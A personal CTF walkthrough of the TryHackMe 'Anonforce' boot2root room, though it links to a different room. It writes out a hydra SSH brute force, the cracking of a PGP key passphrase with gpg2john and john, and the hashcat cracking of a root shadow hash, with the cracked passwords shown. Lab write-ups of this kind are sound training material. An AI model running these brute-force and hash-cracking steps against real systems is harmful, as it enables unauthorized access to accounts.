---
title: Walkthrough - Anonforce
published: true
---

Security. boot2root machine for FIT and bsides guatemala CTF.

[https://tryhackme.com/room/yearoftherabbit](https://tryhackme.com/room/yearoftherabbit)

* * *

## Notes

a ftp and an ssh server

ftp allowd anon connections so connecting to that we find a user `melodias`. lets start a hydra ssh while we try to find more info.

- `hydra -l melodias -P /usr/share/seclists/Passwords/rockyou.txt 10.10.146.159 ssh`

So found a few new interesting files to check out `pricate.asc` which is an asc file. ASC files are used for posting online security notices as well as securely transmitting messages. Also find a `backup.pgp` which is a pretty good privacy security key. What can we do with these?

- `pgpdump backup.pgp`
- we can try to import the private key `gpg --import private.asc` but doing so we need a passphrase to import.
- feed it to gpg2john `gpg2john private.asc > private-john.asc` then feed the output to john `john private-john.asc --wordlist=/usr/share/seclists/Passwords/rockyou.txt`

```
┌──(0xskar㉿cocokali)-[~/Documents/TryHackMe/Anonforce/ftp]
└─$ john private-john.asc --wordlist=/usr/share/seclists/Passwords/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
xbox360          (anonforce)     
1g 0:00:00:00 DONE (2022-08-10 23:04) 5.555g/s 5177p/s 5177c/s 5177C/s xbox360..madalina
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

- now we can import the key `gpg --import private.asc` 
- and then decrypt the `backup.gpg` - `gpg --decrypt backup.pgp`

Clipping this as we have 2 different hashes.

- root.hash

```
root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::
```

- `hcat -m 1800 root.hash /usr/share/seclists/Passwords/rockyou.txt`
- cracked `$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:hikari`

- melodias.hash

```
melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7:::
```

- `hashcat -m 500 melodias.hash /usr/share/seclists/Passwords/rockyou.txt`
- exhausted



* * * 

## What is the user flag?

- `cat user.txt`

* * * 

## What is the root flag?

- `cat root.txt`

* * * 

